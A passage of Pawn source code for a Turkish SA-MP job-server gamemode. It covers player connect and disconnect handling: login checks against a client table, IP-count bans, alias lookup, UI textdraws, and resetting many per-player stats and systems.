	KillTimer(HouseTimer);

	//SQL::Close(Connection);

	new panels, doors, lights, tires;

	for(new i=0; i<GetVehiclePoolSize(); i++)
	{
	    if(Flashing[i] == true)
	    {
	    	KillTimer(FlashTime[i]);

	    	GetVehicleDamageStatus(i, panels, doors, lights, tires);
	    	UpdateVehicleDamageStatus(i, panels, doors, 0, tires);

	    	Flashing[i] = false;
		}
	}
	LOG("Sunucu kapatildi.");
	return 1;
}

// GetIPCount
GetIPCount(IP[])
{
	new Sonuc = 0;
	foreach(new playerid:Player)
	{
		if(!strcmp(GetIP2(playerid), IP, true))
		{
			Sonuc++;
		}
	}
	return Sonuc;
}

new bool:CikisYazdir[MAX_PLAYERS] = true;


// This callback gets called when a player connects to the server
public OnPlayerConnect(playerid)
{
//    pAclik[playerid] = 100;
// 	pSusuzluk[playerid] = 100;

    //pBarKullan[playerid] = 0;

    bugBildirdi[playerid] = 0;

	
	APlayerData[playerid][LoggedIn] = false;

	// Emeðe saygý amaçlý silmeyiniz!
//	SendClientMessage(playerid, 0xFF00FFFF, "Umut {FFFFFF} Açlýk sistemi aktifleþtirildi");
  //  SendClientMessage(playerid, 0xFF00FFFF, "Umut {FFFFFF} Hastane Pickup sistemi aktifleþtirildi");
    // Emeðe saygý amaçlý silmeyiniz!
    


	// Anti Nick Deðiþtirme
	GetPlayerName(playerid, SonNick[playerid], 40);

	//

	// Always allow NPC's to login without password or account
	if (IsPlayerNPC(playerid))
		return 1;

    // Oyuncu Tepe Yazýsý
	Oyuncu3D_Yukle(playerid);

    new normalNick[MAX_PLAYERS][128];
	if(ClientMode == 0 && !IsPlayerNPC(playerid))
	{
	    new gkontrolName[MAX_PLAYER_NAME];
		GetPlayerName(playerid, gkontrolName, MAX_PLAYER_NAME);
		if(gkontrolName[0] == 'T' && gkontrolName[1] == 'M' && gkontrolName[2] == '_')
		{

		}else{
		    SendErrorMessage(playerid, "Hosgeldiniz Canakkale Meslek Sunucusu 7/24!");
		    SendClientMessage(playerid, -1, "{FFFFFF}Forum adresimiz www.canakkalefr.com {FFFFFF} sayfasýný ziyaret edebilirsin!");
	        
	        return 1;
		}
	    new clientID[2][128];
		split(GetName(playerid), clientID, '_');
		format(APlayerData[playerid][PlayerClientID], 40, clientID[1]);

	    new query[256]/*, Msg[128]*/, Cache: get_isyeri;

		mysql_format(Connection, query, sizeof(query), "SELECT * FROM clientGiris WHERE randomID = '%s'", clientID[1]);
		get_isyeri = mysql_query(Connection, query);
		new rows = cache_num_rows();


		if(rows)
		{
			new gyil, gay, ggun, gsaat, gdakika, gsaniye;
	        new handle = SQL::OpenEx(SQL::READ, "clientGiris", "randomID", clientID[0]);
	    	SQL::ReadString(handle, "normalNick", normalNick[playerid], 300);
	     	SQL::ReadInt(handle, "girisGun", ggun);
	     	SQL::ReadInt(handle, "girisAy", gay);
	     	SQL::ReadInt(handle, "girisYil", gyil);
	     	SQL::ReadInt(handle, "girisSaat", gsaat);
	    	SQL::ReadInt(handle, "girisDakika", gdakika);
	        SQL::ReadInt(handle, "girisSaniye", gsaniye);

	        new saat, dakika, saniye;
	        gettime(saat, dakika, saniye);
	        new gun, ay, yil;
	        getdate(yil, ay, gun);

	    	SQL::Close(handle);
	    	SetPlayerName(playerid, normalNick[playerid]); // Client adýný veriyoruzv
	    	if(gyil != yil)
			{
			    printf("%s isimli kisinin yil degeri uyusmadigindan atildi! %d %d", normalNick[playerid], gyil, yil);
				SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
			    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
			    SafeKick(playerid);
			}
			else
			if(gay != ay)
			{
			    printf("%s isimli kisinin ay degeri uyusmadigindan atildi! %d %d", normalNick[playerid], gay, ay);
			    SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
			    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
			    SafeKick(playerid);
			}
			else
			if(ggun != gun)
			{
			    printf("%s isimli kisinin gun degeri uyusmadigindan atildi! %d %d", normalNick[playerid], ggun, gun);
			    SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
			    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
			    SafeKick(playerid);
			}
			else
			if(gsaat != saat)
			{
			    printf("%s isimli kisinin saat degeri uyusmadigindan atildi! %d %d", normalNick[playerid], gsaat, saat);
			    SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
			    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
			    SafeKick(playerid);
			}
			else
			if(gsaniye < 20)
			{
			    if(gdakika != dakika)
			    {
			        printf("%s isimli kisinin saniye-20 gdakika degeri uyusmadigindan atildi!", normalNick[playerid]);
			        SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
				    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
				    SafeKick(playerid);
			    }
			}
			else
			if((gdakika+1) < dakika)
			{
			    printf("%s isimli kisinin gdakika+1 ++ degeri uyusmadigindan atildi! %d %d", normalNick[playerid], (gdakika+1), dakika);
				SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
			    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
			    SafeKick(playerid);
			}
			else
			if(saniye > 40)
			{
			    printf("%s isimli kisinin saniye+40 ++ degeri uyusmadigindan atildi! %d %d", normalNick[playerid], gsaniye, saniye);
			    SendErrorMessage(playerid,"Client'in size izin verdiði süre içerisinde oyuna giriþ yapmadýnýz!");
			    SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} Lütfen tekrar deneyiniz!");
			    SafeKick(playerid);
			    
			}
			SQL::DeleteRowEx("clientGiris", "randomID", clientID[0]);
		//	SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF}Client baðlantýnýz saðlandý oyun adýnýz %s olarak güncellendi iyi oyunlar.", normalNick[playerid]);
		}else{
		    SendErrorMessage(playerid, "Hosgeldiniz Canakkale Meslek Sunucusu 7/24!");
		    SendClientMessage(playerid, -1, "{FFFFFF}Forum adresimiz www.canakkalefr.com {FFFFFF} sayfasýný ziyaret edebilirsin!");
		}
		
		cache_delete(get_isyeri);
        return 1;
	}
	CikisYazdir[playerid] = true;

    
	new NewPlayerMsg[300];
	format(NewPlayerMsg, 300, "%s(%d) oyuna girdi [IP: %s]", GetName(playerid), playerid, GetIP2(playerid));
	LOG(NewPlayerMsg);
	
	// MySQL Ban Sistemi
	if(BanControl(playerid) == 1) return 1;

    tmodetype[playerid] = 0;
	// PaintBall Sistemi
	SetPlayerMapIcon(playerid,0,1310.1099,-1367.9067,13.5421,18,-1,0);
	PlayerPBing[playerid] = false;
    PlayerPBKills[playerid] = 0;

	
	APlayerData[playerid][SoruSordu] = 0;
	APlayerData[playerid][SoruCevaplayan] = -1;
	APlayerData[playerid][SoruCevapliyor] = 0;
	APlayerData[playerid][SoruBekliyor] = 0;
	APlayerData[playerid][SorusuCevaplaniyor] = 0;
	APlayerData[playerid][SoruCevapladigi] = -1;

    SilahUyari[playerid] = 0;
	SilahUyariM[playerid] = 0;
	// EXP sistemi
	Level[playerid] = 0;
	EXP[playerid] = 0;
	OncekiRank[playerid] = 0;
	OncekiEXP[playerid] = 0;

	UI_Rank[playerid][0] = CreatePlayerTextDraw(playerid, 500.000000, 104.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, UI_Rank[playerid][0], 255);
	PlayerTextDrawFont(playerid, UI_Rank[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid, UI_Rank[playerid][0], 0.500000, 0.899999);
	PlayerTextDrawColor(playerid, UI_Rank[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid, UI_Rank[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid, UI_Rank[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, UI_Rank[playerid][0], 1);
	PlayerTextDrawUseBox(playerid, UI_Rank[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, UI_Rank[playerid][0], 255);
	PlayerTextDrawTextSize(playerid, UI_Rank[playerid][0], 606.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid, UI_Rank[playerid][0], 0);

	UI_Rank[playerid][1] = CreatePlayerTextDraw(playerid, 501.000000, 105.000000, "__");
	PlayerTextDrawBackgroundColor(playerid, UI_Rank[playerid][1], 255);
	PlayerTextDrawFont(playerid, UI_Rank[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid, UI_Rank[playerid][1], 0.500000, 0.599999);
	PlayerTextDrawColor(playerid, UI_Rank[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid, UI_Rank[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid, UI_Rank[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, UI_Rank[playerid][1], 1);
	PlayerTextDrawUseBox(playerid, UI_Rank[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, UI_Rank[playerid][1], (0x1E90FFFF & 0xFFFFFF00) | (0x66 & ((0x1E90FFFF & 0x000000FF) / 2)));
	PlayerTextDrawTextSize(playerid, UI_Rank[playerid][1], 605.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid, UI_Rank[playerid][1], 0);

	UI_Rank[playerid][2] = CreatePlayerTextDraw(playerid, 501.000000, 105.000000, "___");
	PlayerTextDrawBackgroundColor(playerid, UI_Rank[playerid][2], 255);
	PlayerTextDrawFont(playerid, UI_Rank[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid, UI_Rank[playerid][2], 0.500000, 0.599999);
	PlayerTextDrawColor(playerid, UI_Rank[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid, UI_Rank[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid, UI_Rank[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, UI_Rank[playerid][2], 1);
	PlayerTextDrawUseBox(playerid, UI_Rank[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, UI_Rank[playerid][2], 0x1E90FFFF);
	PlayerTextDrawTextSize(playerid, UI_Rank[playerid][2], 605.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid, UI_Rank[playerid][2], 0);

	UI_Rank[playerid][3] = CreatePlayerTextDraw(playerid, 555.000000, 103.000000, "Yukleniyor");
	PlayerTextDrawAlignment(playerid, UI_Rank[playerid][3], 2);
	PlayerTextDrawBackgroundColor(playerid, UI_Rank[playerid][3], 255);
	PlayerTextDrawFont(playerid, UI_Rank[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid, UI_Rank[playerid][3], 0.189999, 1.000000);
	PlayerTextDrawColor(playerid, UI_Rank[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid, UI_Rank[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, UI_Rank[playerid][3], 1);
	PlayerTextDrawSetSelectable(playerid, UI_Rank[playerid][3], 0);

	// Karavan Sistemi
	pKaravan[playerid] = -1;

    APlayerData[playerid][PlayerRehberLevel] = 0;
    APlayerData[playerid][SoruSordu] = 0;
    APlayerData[playerid][PlayerSpeedWarn] = 0;
    Serial_BanKontrol(playerid);
    if(strfind(GetName(playerid), "Meriva", true) != -1 || strfind(GetName(playerid), "meriva", true) != -1)
    {
        Kick(playerid);
    }

    SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);



	for(new i = 0; i < 12; i++)
	{
    OyuncununSilahlari[playerid][i] = 0;
	}

	isyerimdeyim[playerid] = 0;

	//HGS
	//MoneyTimer[playerid] = -1;
	//There where you start the timer: HGS
	//MoneyTimer[playerid] = SetTimerEx("OnDriverGetMoney",500,1,"i",playerid);

    


    // AKA Sistemi
	LoadAKA(playerid);
	new AKA[256]; AKA = dini_Get("ServerData/aka.txt", GetIP2(playerid));
	if(strlen(AKA) >= 3)
	{
	    if(!strcmp(AKA, GetName(playerid), true))
	    { }else
		{
		    new AKAYazi[1024];
	        format(AKAYazi, 1024, "{4867FF}[AKA] {F8F8FF}%s(%d) {ADFF2F}=> {F8F8FF}%s", GetName(playerid), playerid, AKA);
	        foreach(new akalo:Player)
	        {
	            if(APlayerData[akalo][LoggedIn] == false) continue;
	            if(akalo == playerid) continue;
	            if(APlayerData[akalo][PlayerLevel] > 2 || Root[akalo] == 1) SendClientMessage(akalo, -1, AKAYazi);
	        }
	    }
	}

	// IP Kontrol
	if(GetIPCount( GetIP2(playerid) ) >= 4)
	{
		format(NewPlayerMsg, 300, "banip %s", GetIP2(playerid));
		SendRconCommand(NewPlayerMsg);
		SafeKick(playerid);
		return 1;
	}

	//Etkinlik Sistemi
	g_Flags[playerid] = e_Flags: 0;

	// Balon Sistemi
	Balonda[playerid] = false;

	// huseyin Santa Maria Beach Mansion
	HusoEvde[playerid] = false;

	// Banka Sistemi
	CurrentAccountID[playerid] = -1;
	LogListType[playerid] = TYPE_NONE;
	LogListPage[playerid] = 0;


	// Arkadaþlýk Sistemi
  	ArkYukle(playerid);
    SetPVarInt(playerid, "msj_gID", -1);

	// Çöpçü Mesleði
	MeslekDurum[playerid] = 0;
	BayrakMesaj[playerid] = 0;
	BayrakMesaj2[playerid] = 0;
	CopAraba[playerid] = -1;
	ElindekiCop[playerid] = -1;
	//APlayerData[playerid][StatsGJobs] = 0;

	// V5 Oyuncu Arayüzü
	LoadPlayerV5UI(playerid);

	// V4 Oyuncu Arayüzü
	//LoadPlayerUI(playerid);

	// NO WARNING
	KutuInfo[playerid] = 0 ;

	// Giþe Sistemi
	GiseEkliyor[playerid] = false;

	// Para Verme Sýnýrlamasý
	ParaVerTimer[playerid] = 0;
	BParaVerTimer[playerid] = 0;

	//
    TDEditor_PTD[playerid][0] = CreatePlayerTextDraw(playerid, 320.000000, 215.100479, "DAHA_DIKKATLI_OLMALISIN");
	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][0], 0.352331, 1.583407);
	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][0], 2);
	PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][0], -2359116);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_PTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_PTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][0], 0);


	// Anti Teleport Sistemi
	//BirSureBakmaTamam[playerid] = 0;

	// Anti Flood Sistemi ( Anti Bot Attack )
	BotControl(playerid);
	ReqSpawnDurdur[playerid] = 0;
	ReqSpawnSayisi[playerid] = 0;

	// Müsait
	Musait[playerid] = true;

	// VIP Sistemi
	VIP[playerid] = 0;
	YVIP[playerid] = 0;
	format(VIPBitis[playerid], 20, "Yok");

	// Donator Sistemi
	APlayerData[playerid][PlayerDonLevel] = 0;

	// Setup local variables
	new Name[MAX_PLAYER_NAME];

	// Setup a PVar to allow cross-script money-transfers (only from filterscript to this mainscript) and scorepoints
	SetPVarInt(playerid, "PVarMoney", 0);
	SetPVarInt(playerid, "PVarScore", 0);

	// Get the playername
	GetPlayerName(playerid, Name, sizeof(Name));
	// Also store this name for the player
	GetPlayerName(playerid, APlayerData[playerid][PlayerName], 24);

	// Sýfýrlama
	APlayerData[playerid][PlayerMoney] = 0;
	APlayerData[playerid][PlayerScore] = 0;

	APlayerData[playerid][SpectateID] = -1;
	APlayerData[playerid][SpectateVehicle] = -1;
	APlayerData[playerid][SpectateType] = ADMIN_SPEC_TYPE_NONE;
	APlayerData[playerid][PlayerPassword] = 0;
	APlayerData[playerid][PlayerAdmPassword] = 0;
	APlayerData[playerid][PlayerLevel] = 0;
	APlayerData[playerid][PlayerFLevel] = 0;
	APlayerData[playerid][PlayerJailed] = 0;
	KillTimer(APlayerData[playerid][PlayerFrozenTimer]);
	APlayerData[playerid][PlayerFrozen] = 0;
	APlayerData[playerid][Bans] = 0;
	APlayerData[playerid][BanTime] = 0;
	APlayerData[playerid][Muted] = 0;
	APlayerData[playerid][RulesRead] = false;
	APlayerData[playerid][AutoReportTime] = 0;
	APlayerData[playerid][TruckerLicense] = 0;
	APlayerData[playerid][BusLicense] = 0;
	APlayerData[playerid][DolmusLicense] = 0;
	APlayerData[playerid][PilotLicense] = 0;
	APlayerData[playerid][GemiciLicense] = 0;
	APlayerData[playerid][MafiaLicense] = 0;
	APlayerData[playerid][PlayerClass] = 0;
	APlayerData[playerid][Warnings] = 0;

	// MeslekUI
	MeslekUI_PLoad(playerid);

	// Clear stats
	APlayerData[playerid][StatsTruckerJobs] = 0;
	APlayerData[playerid][StatsConvoyJobs] = 0;
	APlayerData[playerid][StatsBusDriverJobs] = 0;
	APlayerData[playerid][StatsDolmusDriverJobs] = 0;
	APlayerData[playerid][StatsPilotJobs] = 0;
	APlayerData[playerid][StatsMafiaJobs] = 0;
	APlayerData[playerid][StatsMafiaStolen] = 0;
	APlayerData[playerid][StatsPoliceFined] = 0;
	APlayerData[playerid][StatsPoliceJailed] = 0;
	APlayerData[playerid][StatsFBYFined] = 0;
	APlayerData[playerid][StatsFBYJailed] = 0;
	APlayerData[playerid][StatsRoadworkerJobs] = 0;
	APlayerData[playerid][StatsGemiciJobs] = 0;
	APlayerData[playerid][StatsOduncuJobs] = 0;
	APlayerData[playerid][StatsBalikciJobs] = 0;
	APlayerData[playerid][StatsPboyJobs] = 0;
	APlayerData[playerid][StatsKargocuJobs] = 0;
	APlayerData[playerid][StatsMetersDriven] = 0.0;

	APlayerData[playerid][PilotLicense] = 0;

	KesilenAgac[playerid] = 0;
	EldekiBalik[playerid] = 0;

	// Clear police warnings
	APlayerData[playerid][PoliceCanJailMe] = false;
	APlayerData[playerid][PoliceWarnedMe] = false;
	APlayerData[playerid][Value_PoliceCanJailMe] = 0;

	APlayerData[playerid][FBYCanJailMe] = false;
	APlayerData[playerid][FBYWarnedMe] = false;
	APlayerData[playerid][Value_FBYCanJailMe] = 0;

	//
	God[playerid] = 0;
	OnayliOyuncu[playerid] = 0;
	carmsg[playerid] = 0;
	canmsg[playerid] = 0;
	Sellektor[playerid] = 0;
	polisyazi[playerid] = 0;
	tiryazi[playerid] = 0;
	rankbildirdim[playerid] = -1;
	SonGorev[playerid][0] = -1;
	SonGorev[playerid][1] = -1;
	SilahIzni[playerid] = 0;
	modcmd[playerid] = 0;

	APlayerData[playerid][SpectateID] = -1;

	// Tren Sistemi
	Bilet[playerid] = 1475;

	// Anti Flood
	otovites[playerid] = 1;
	MesajSustur[playerid] = 0;
	SpawnDurdur[playerid] = 0;
	KomutDurdur[playerid] = 0;
	DurumDurdur[playerid] = 0;
	OlumDurdur[playerid] = 0;
	DialogDurdur[playerid] = 0;
	AfkDurum[playerid] = 0;
	HidrolikVarmi[playerid] = 0;
	KomutZaman[playerid] = 0;
	FloodZaman[playerid] = 0;
	FloodUyari[playerid] = 0;

	IsimKapat[playerid] = 0;
	TextKapat[playerid] = 0;
	CMDKapat[playerid] = 0;
	DuyuruKapat[playerid] = 0;

	// Rank Sistemi
	Rank[playerid] = 0;
	MeslekdeYaparmis[playerid] = 0;

	// TMMobile Sistemi
	TMM_BGSel[playerid] = 1;
	MPMode[playerid] = 0;
	LoadTMMobile(playerid);
	/* ESKÝ SÝSTEM
	LoadMPUI(playerid);
	MPde[playerid] = 0;
	MPMode[playerid] = 1;
	MPMuzikte[playerid] = false;
	*/

	// Metin ile sabah sabah deliriyok
	pSkin[playerid] = -1;

	PMGapat[playerid] = 0;

	MagaraAdami[playerid] = 0;

	GorevTime[playerid] = 0;

	FakeLevel[playerid] = 0;

    APlayerSpawnData[playerid] = false;

	APlayerData[playerid][PlayerDjLevel] = 0;

	// Þirket Sistemi
	Sirket[playerid] = -1;
	SirketRutbe[playerid] = 0;
	TSirketDurum[playerid] = 0;
	SirketTeklifEden[playerid] = -1;
	SirketDorse[playerid] = -1;
	SirketKatki[playerid] = 0;
	SirketBenzini[playerid] = 0;

	// Ahýr Sistemi & Animasyonlar
    Ahirin[playerid] = -1;
    AhirKurban[playerid] = -1;

	PreloadAnimLib(playerid,"BOMBER");
	PreloadAnimLib(playerid,"RAPPING");
	PreloadAnimLib(playerid,"SHOP");
	PreloadAnimLib(playerid,"BEACH");
	PreloadAnimLib(playerid,"SMOKING");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"ON_LOOKERS");
	PreloadAnimLib(playerid,"DEALER");
	PreloadAnimLib(playerid,"CRACK");
	PreloadAnimLib(playerid,"CARRY");
	PreloadAnimLib(playerid,"COP_AMBIENT");
	PreloadAnimLib(playerid,"PARK");
	PreloadAnimLib(playerid,"INT_HOUSE");
	PreloadAnimLib(playerid,"FOOD");

	PreloadAnimLib(playerid,"DAM_JUMP");
	PreloadAnimLib(playerid,"CAMERA");
	PreloadAnimLib(playerid,"BD_FIRE");
	PreloadAnimLib(playerid,"STRIP");
	PreloadAnimLib(playerid,"COLT45");
	PreloadAnimLib(playerid,"SWEET");
	PreloadAnimLib(playerid,"ON_LOOKERS");
	PreloadAnimLib(playerid,"UZI");
	PreloadAnimLib(playerid,"PAULNMAC");
	PreloadAnimLib(playerid,"KISSING");
	PreloadAnimLib(playerid,"BLOWJOBZ");
	PreloadAnimLib(playerid,"SNM");

	// BoomBox Sistemi
	DinlenilenBoomBox[playerid] = -1;
	OyuncuBB[playerid] = -1;
	EditingBBObject[playerid] = -1;

	// Saklý Kasa Sistemi
	SakliKasaTamam[playerid] = 0;
	EmptySakliKasaInfo(playerid);
	SakliKasaTasiyor[playerid] = 0;
    // Yeni SendAdminText
	LoadSendAdminText(playerid);
	    // Yeni SendDuyuruText
	LoadSendDuyuruText(playerid);
	// SPanel Sistemi
	Root[playerid] = 0;

	new Yazi[256];
	format(Yazi, 256, "Sende Yaz Yaz Bikere....", Yazi);


/*	if (PlayerFile_Load(playerid) == 1)
	{
		if (APlayerData[playerid][BanTime] < gettime())
		{
		    girisSure[playerid] = SetTimerEx("girisKick", 60000, false, "i", playerid);
			ShowPlayerDialog(playerid, DialogLogin, DIALOG_STYLE_PASSWORD, TXT_DialogLoginTitle, TXT_DialogLoginMsg, TXT_DialogLoginButton1, TXT_DialogButtonCancel);
   		}
		else
		{
			ShowRemainingBanTime(playerid);

			format(Yazi, 256, "{FF0000}%s {FCB000}sunucudan yasaklý olduðu için tekmelendi.", GetName(playerid));
			SendClientMessageToAll(-1, Yazi);

			SafeKick(playerid);
		}
	}
	else
		ShowPlayerDialog(playerid, DialogRegister, DIALOG_STYLE_INPUT, TXT_DialogRegisterTitle, TXT_DialogRegisterMsg, TXT_DialogRegisterButton1, TXT_DialogButtonCancel);
*/
	// Giris Mesaji  {10F7F7}* * * * {ffff00}Level 6 Admin {ff0000}%s {dddddd}ID:(%d){ffff00}Sunucuya Giris Yapti{10F7F7} * * * *. {DDDDDD}(Hileleri Kapatmaniz Tavsiye edilir)

   
	// Giris Mesaji
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Canakkale({FFCC00}2013 {FFFFFF}- {FFCC00}2018{FFFFFF}) Meslek {FFCC00}/{FFFFFF} Job Server.");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Oyunla ilgili yardým almak için {FFCC00}/yardim {FFFFFF}Yazabilirsiniz.");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Komutlarý öðrenmek için {FFCC00}/komutlar {FFFFFF}Yazabilirsiniz.");
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Ayrica Forumumuza Kayit Olmayi unutmayin {FFCC00}www.canakkalefr.com");

	if(Rekor > 0)
	{
		new NPM[256];
		format(NPM, 256, "{FFCC00}» {FFFFFF}Sunucu rekorumuzu ({FFCC00}%s) {FFFFFF}- Tarihinde kýrdýk. Rekor: {FFCC00}%d {FFFFFF}Kiþi.", RekorTarih, Rekor);
        SendClientMessage(playerid, -1, " ");
		SendClientMessage(playerid, -1, NPM);
	}

    
    
	

    Player_LoadHouses(playerid);
	/*for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
	{
		if (APlayerData[playerid][Houses][HouseSlot] != 0)
  		{
	  		HouseFile_Load(APlayerData[playerid][Houses][HouseSlot], true);
		}
	}*/

	// Speedometer setup
	Speedometer_Setup(playerid);

	// MissionText TextDraw setup
	/*APlayerData[playerid][MissionText] = TextDrawCreate(330.000000, 435.000000, " ");
	TextDrawAlignment(APlayerData[playerid][MissionText], 2);
	TextDrawBackgroundColor(APlayerData[playerid][MissionText], 255);
	TextDrawFont(APlayerData[playerid][MissionText], 2);
	TextDrawLetterSize(APlayerData[playerid][MissionText], 0.289999, 1.000000);
	TextDrawColor(APlayerData[playerid][MissionText], -1347440641);
	TextDrawSetOutline(APlayerData[playerid][MissionText], 1);
	TextDrawSetProportional(APlayerData[playerid][MissionText], 1);*/
	//kurallar text
	// Display a message if the player hasn't accepted the rules yet
	if (APlayerData[playerid][RulesRead] == false)
 	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Henuz Kurallarý Okumadýnýz , Kurallarý Okumak Ýcin {FFCC00}/kurallar{FFFFFF} Yaziniz");
		//PlayAudioStreamForPlayer(playerid, "http://openmt2.com/lwt/kurallar.mp3");
	}
	// Setup local variables
	//new BusID;

	// Update the AutoEvict-time for this player's houses and businesses
/*	for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
	{
	    // Get the HouseID from this slot
	    HouseID = APlayerData[playerid][Houses][HouseSlot];
	    // Check if there is a house in this slot
		if (HouseID != 0)
			AHouseData[HouseID][AutoEvictDays] = AutoEvict[AEDays];
	}
	for (new BusSlot; BusSlot < MAX_BUSINESSPERPLAYER; BusSlot++)
	{
	    // Get the BusID from this slot
	    BusID = APlayerData[playerid][Business][BusSlot];
	    // Check if there is a business in this slot
		if (BusID != 0)
			ABusinessData[BusID][AutoEvictDays] = AutoEvict[AEDays];
	}*/

	// Mapler
	BinaSil(playerid); // MAPLER

	for(new i; i < sizeof(Zone); i++)
	{
		GangZoneShowForPlayer(playerid, Zone[i], 0xcd6839FF);
	}

    GangZoneShowForPlayer(playerid, FZone[0], 0x4169E1FF);
    GangZoneShowForPlayer(playerid, FZone[1], 0x4169E1FF);
    //Kemer sistemi
    SeatbeltStatus[playerid] = 0;

	return 1;
}

// This function shows the player how long his ban still is when he tries to login (in days, hours, minutes, seconds)

/*ShowRemainingBanTime(playerid)
{
	// Setup local variables
	new TotalBanTime, Days, Hours, Minutes, Seconds, Msg[128];

	// Get the total ban-time
	TotalBanTime = APlayerData[playerid][BanTime] - gettime();

	// Calculate days
	if (TotalBanTime >= 86400)
	{
		Days = TotalBanTime / 86400;
		TotalBanTime = TotalBanTime - (Days * 86400);
	}
	// Calculate hours
	if (TotalBanTime >= 3600)
	{
		Hours = TotalBanTime / 3600;
		TotalBanTime = TotalBanTime - (Hours * 3600);
	}
	// Calculate minutes
	if (TotalBanTime >= 60)
	{
		Minutes = TotalBanTime / 60;
		TotalBanTime = TotalBanTime - (Minutes * 60);
	}
	// Calculate seconds
	Seconds = TotalBanTime;

	// Display the remaining ban-time for this player
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_StillBanned);
	format(Msg, 128, TXT_BannedDuration, Days, Hours, Minutes, Seconds);
	SendClientMessage(playerid, 0xFFFFFFFF, Msg);
}
*/

//3defa yanlis sifre
forward KickPlayer(playerid);
public KickPlayer(playerid)
{
      Kick(playerid);
}
// This callback gets called when a player disconnects from the server
public OnPlayerDisconnect(playerid, reason)
{
    PlayerEditingPickup[playerid] = false;
    //pBarKullan[playerid] = 0;
    
    if(playerChangeColor{playerid} == true)
    {
		playerChangeColor{playerid} = false;
        KillTimer(OtoRenkTimer[playerid]);
    }
    
    // M1
  	if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
  
	// PaintBall
	if(PlayerPBing[playerid] == true)
	{
		PBPlayers--;
	}
	// Oyuncu Tepe Yazýsý
	Oyuncu3D_Sil(playerid);
	
	if(APlayerData[playerid][SoruCevapliyor] == 1)
	{
	    APlayerData[APlayerData[playerid][SorusuCevaplaniyor]][SoruBekliyor] = 1;
	    SendClientMessage(APlayerData[playerid][SorusuCevaplaniyor],-1,"Sorunuzu cevaplayan yetkili oyundan çýktýðýndan sorunuz yanýt bekliyor olarak iþaretlendi");

	}


    APlayerData[playerid][SoruSordu] = 0;
	APlayerData[playerid][SoruCevaplayan] = -1;
	APlayerData[playerid][SoruCevapliyor] = 0;
	APlayerData[playerid][SoruBekliyor] = 0;
	APlayerData[playerid][SorusuCevaplaniyor] = 0;
	APlayerData[playerid][SoruCevapladigi] = -1;

    APlayerData[playerid][SoruSordu] = 0;

	// Anti Teleport Sistemi
	//BirSureBakmaTamam[playerid] = 0;

	// Always allow NPC's to logout without password or account
	if (IsPlayerNPC(playerid))
		return 1;

	if(girisSure[playerid] != -1)
	{
	    KillTimer(girisSure[playerid]);
	    girisSure[playerid] = -1;
	}
	//3defa sifre
	pInfo[playerid][pSifreHak] = 0;

	// Setup local variables
